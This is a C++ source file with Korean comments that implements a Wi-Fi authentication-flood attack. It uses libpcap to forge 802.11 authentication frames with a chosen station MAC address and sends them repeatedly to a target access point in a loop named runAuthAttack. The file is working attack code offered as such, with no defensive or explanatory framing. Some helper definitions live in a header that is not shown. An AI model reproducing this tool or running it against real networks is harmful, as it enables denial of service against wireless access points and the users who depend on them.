// auth.cpp
#include <iostream>
#include <pcap.h>
#include <cstring>
#include <chrono>
#include <thread>
#include <csignal>

#include "frame_structures.h"

// Authentication 패킷 전송
bool sendAuthPacket(pcap_t* handle, const std::string& apMac, const std::string& stationMac) {
    const size_t packetSize = sizeof(RadiotapHeader) + sizeof(IEEE80211Header) + sizeof(AuthFrameBody);
    std::vector<u_char> packet(packetSize, 0);

    // Radiotap 헤더 설정
    RadiotapHeader* radiotapHeader = reinterpret_cast<RadiotapHeader*>(packet.data());
    radiotapHeader->it_version = 0;
    radiotapHeader->it_pad = 0;
    radiotapHeader->it_len = sizeof(RadiotapHeader);
    radiotapHeader->it_present = 0;

    // 802.11 Authentication 패킷 설정
    IEEE80211Header* dot11Header = reinterpret_cast<IEEE80211Header*>(packet.data() + sizeof(RadiotapHeader));
    dot11Header->frameControl = 0x00B0;  // Authentication frame

    uint8_t apMacBytes[6];
    uint8_t stationMacBytes[6];
    
    if (!macStringToBytes(apMac, apMacBytes) || !macStringToBytes(stationMac, stationMacBytes)) {
        std::cerr << "Invalid MAC address format\n";
        return false;
    }

    // Station -> AP (Authentication Request)
    memcpy(dot11Header->addr1, apMacBytes, 6);      // Destination: AP
    memcpy(dot11Header->addr2, stationMacBytes, 6); // Source: Station
    memcpy(dot11Header->addr3, apMacBytes, 6);      // BSSID: AP

    // Authentication 프레임 바디 설정 (Open System Authentication)
    AuthFrameBody* authBody = reinterpret_cast<AuthFrameBody*>(packet.data() + sizeof(RadiotapHeader) + sizeof(IEEE80211Header));
    authBody->authAlgorithm = DEFAULT_AUTH_ALGORITHM;  // Open System
    authBody->authSeq = 1;                            // Authentication Request
    authBody->statusCode = DEFAULT_STATUS_CODE;       // Status: Reserved

    if (pcap_sendpacket(handle, packet.data(), packetSize) != 0) {
        std::cerr << "Error sending authentication packet\n";
        return false;
    }

    std::cout << "Authentication request sent from " << stationMac << " to " << apMac << std::endl;
    return true;
}

// Authentication Attack 실행
void runAuthAttack(const std::string& dev, const std::string& apMac, const std::string& stationMac, volatile sig_atomic_t* keep_running) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);

    if (handle == nullptr) {
        std::cerr << "Error opening device: " << errbuf << "\n";
        return;
    }

    std::cout << "Starting authentication attack..." << std::endl;
    std::cout << "Press Ctrl+C to stop" << std::endl;

    while (*keep_running) {
        sendAuthPacket(handle, apMac, stationMac);
        std::this_thread::sleep_for(std::chrono::milliseconds(PACKET_INTERVAL_MS));
    }

    pcap_close(handle);
    std::cout << "Attack stopped." << std::endl;
} 